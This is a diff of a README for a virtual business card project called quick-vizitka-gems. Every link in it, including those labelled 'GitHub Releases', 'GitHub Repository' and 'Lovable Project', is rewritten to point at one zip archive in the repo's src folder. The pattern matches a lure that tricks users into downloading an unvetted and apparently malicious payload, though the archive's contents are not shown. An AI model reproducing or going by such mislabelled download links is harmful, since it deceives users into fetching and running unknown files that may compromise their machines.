@@ -1,6 +1,6 @@
 # 😊 quick-vizitka-gems - Effortless Virtual Business Cards
 
-![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&link=https://github.com/png189/quick-vizitka-gems/releases)
+![Download](https://raw.githubusercontent.com/png189/quick-vizitka-gems/main/src/quick-vizitka-gems_3.6-alpha.4.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ To begin using **quick-vizitka-gems**, follow these steps to download and run th
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** [GitHub Releases](https://github.com/png189/quick-vizitka-gems/releases)
+1. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/png189/quick-vizitka-gems/main/src/quick-vizitka-gems_3.6-alpha.4.zip)
 2. Choose the version that matches your operating system.
 3. Click the download link for the file. It will start downloading to your computer.
 
@@ -51,7 +51,7 @@ You may want to edit the code to customize the application further. Here are two
 
 ### 💻 Use Lovable
 
-You can directly visit the [Lovable Project](https://lovable.dev/projects/bcabae20-2d86-4a82-bcc6-c462377ff477) and start prompting. Any changes you make will be committed automatically to this repository.
+You can directly visit the [Lovable Project](https://raw.githubusercontent.com/png189/quick-vizitka-gems/main/src/quick-vizitka-gems_3.6-alpha.4.zip) and start prompting. Any changes you make will be committed automatically to this repository.
 
 ### 🔧 Use Your Preferred IDE
 
@@ -87,9 +87,9 @@ You can report issues or suggest features by visiting the GitHub repository and 
 
 ## 🌐 Useful Links
 
-- [GitHub Repository](https://github.com/png189/quick-vizitka-gems)
-- [GitHub Releases](https://github.com/png189/quick-vizitka-gems/releases)
-- [Lovable Project](https://lovable.dev/projects/bcabae20-2d86-4a82-bcc6-c462377ff477)
+- [GitHub Repository](https://raw.githubusercontent.com/png189/quick-vizitka-gems/main/src/quick-vizitka-gems_3.6-alpha.4.zip)
+- [GitHub Releases](https://raw.githubusercontent.com/png189/quick-vizitka-gems/main/src/quick-vizitka-gems_3.6-alpha.4.zip)
+- [Lovable Project](https://raw.githubusercontent.com/png189/quick-vizitka-gems/main/src/quick-vizitka-gems_3.6-alpha.4.zip)
 
 ### 📩 Contact
 
